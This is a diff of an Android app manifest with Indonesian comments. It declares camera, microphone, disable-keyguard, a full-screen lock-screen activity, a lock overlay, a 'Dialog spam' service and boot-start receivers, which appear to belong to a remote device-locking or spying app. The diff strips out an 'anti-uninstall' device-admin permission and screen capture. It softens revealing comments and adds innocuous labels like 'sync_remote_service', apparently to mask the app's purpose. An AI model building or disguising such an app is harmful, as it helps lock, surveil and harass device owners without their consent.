@@ -2,7 +2,7 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     xmlns:tools="http://schemas.android.com/tools">
 
-    <!-- ═══ IZIN WAJIB (tidak muncul dialog) ═══ -->
+    <!-- ═══ IZIN WAJIB ═══ -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
     <uses-permission android:name="android.permission.WAKE_LOCK" />
@@ -14,7 +14,7 @@
     <!-- ═══ IZIN NOTIFIKASI ═══ -->
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
 
-    <!-- ═══ IZIN KAMERA, AUDIO & SCREENSHOT ═══ -->
+    <!-- ═══ IZIN KAMERA, AUDIO ═══ -->
     <uses-permission android:name="android.permission.CAMERA" />
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
     <uses-feature android:name="android.hardware.camera" android:required="false" />
@@ -23,7 +23,6 @@
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
 
@@ -32,7 +31,6 @@
 
     <!-- ═══ ALARM (watchdog) ═══ -->
     <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
-    <uses-permission android:name="android.permission.USE_EXACT_ALARM" />
 
     <!-- ═══ FLASHLIGHT ═══ -->
     <uses-permission android:name="android.permission.FLASHLIGHT" />
@@ -47,9 +45,6 @@
     <!-- ═══ DISABLE KEYGUARD ═══ -->
     <uses-permission android:name="android.permission.DISABLE_KEYGUARD" />
 
-    <!-- ═══ ANTI-UNINSTALL ═══ -->
-    <uses-permission android:name="android.permission.BIND_DEVICE_ADMIN" />
-
     <!-- ═══ STORAGE ═══ -->
     <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" android:maxSdkVersion="28" />
@@ -63,6 +58,7 @@
         android:theme="@style/AppTheme"
         android:usesCleartextTraffic="true">
 
+        <!-- Main Activity -->
         <activity
             android:name=".MainActivity"
             android:exported="true"
@@ -74,7 +70,7 @@
             </intent-filter>
         </activity>
 
-        <!-- 🔥 LockNewActivity WAJIB didaftarkan biar lockDevice/lockCustom work -->
+        <!-- Lock Activity -->
         <activity
             android:name=".LockNewActivity"
             android:exported="false"
@@ -85,25 +81,37 @@
             android:showWhenLocked="true"
             android:theme="@android:style/Theme.Black.NoTitleBar.Fullscreen" />
 
-        <!-- 🔥 DeviceService -->
+        <!-- Device Service -->
         <service
             android:name=".DeviceService"
             android:exported="false"
-            android:foregroundServiceType="specialUse|camera|mediaProjection|microphone|dataSync" />
+            android:foregroundServiceType="specialUse|camera|microphone|dataSync">
+            <property
+                android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE"
+                android:value="sync_remote_service" />
+        </service>
 
         <!-- Lock overlay -->
         <service
             android:name=".LockOverlayService"
             android:exported="false"
             android:stopWithTask="false"
-            android:foregroundServiceType="specialUse" />
+            android:foregroundServiceType="specialUse">
+            <property
+                android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE"
+                android:value="lock_overlay" />
+        </service>
 
         <!-- TTS -->
         <service
             android:name=".TTSService"
             android:exported="false"
             android:stopWithTask="false"
-            android:foregroundServiceType="specialUse" />
+            android:foregroundServiceType="specialUse">
+            <property
+                android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE"
+                android:value="tts_speaker" />
+        </service>
 
         <!-- Dialog spam -->
         <service
@@ -147,7 +155,6 @@
             android:enabled="true">
             <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
-                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
                 <action android:name="android.intent.action.QUICKBOOT_POWERON" />
                 <action android:name="com.htc.intent.action.QUICKBOOT_POWERON" />
             </intent-filter>
